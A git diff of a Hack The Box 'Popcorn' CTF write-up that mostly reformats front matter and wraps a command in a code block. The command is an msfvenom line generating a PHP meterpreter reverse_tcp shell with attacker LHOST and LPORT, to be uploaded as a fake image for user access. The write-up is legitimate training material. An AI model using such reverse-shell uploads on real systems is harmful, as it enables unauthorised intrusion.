@@ -5,9 +5,12 @@ tags:
   - hackthebox
   - ctf
   - writeup
+showdate: true
+toc: true
 ---
-
+{{%summary%}}
 ![img](/images/popcorn-writeup/1.png)
+{{%/summary%}}
 
 A medium difficulty Linux box, where pretty much all the difficulty comes from the road to user, getting root consists in a very straightforward local privilege escalation exploit, user access is achieved by uploading a PHP shell from an image upload page.
 
@@ -59,7 +62,9 @@ So I'm just going to grab a random .torrent file, I went for a Kali Linux image 
 
 Let's see if a meterpreter shell can be sent as a fake image:
 
-    $ msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.67 LPORT=9090 -o baudy.php
+```shell-session
+$ msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.67 LPORT=9090 -o baudy.php
+```
 
 ![img](/images/popcorn-writeup/12.png)
 
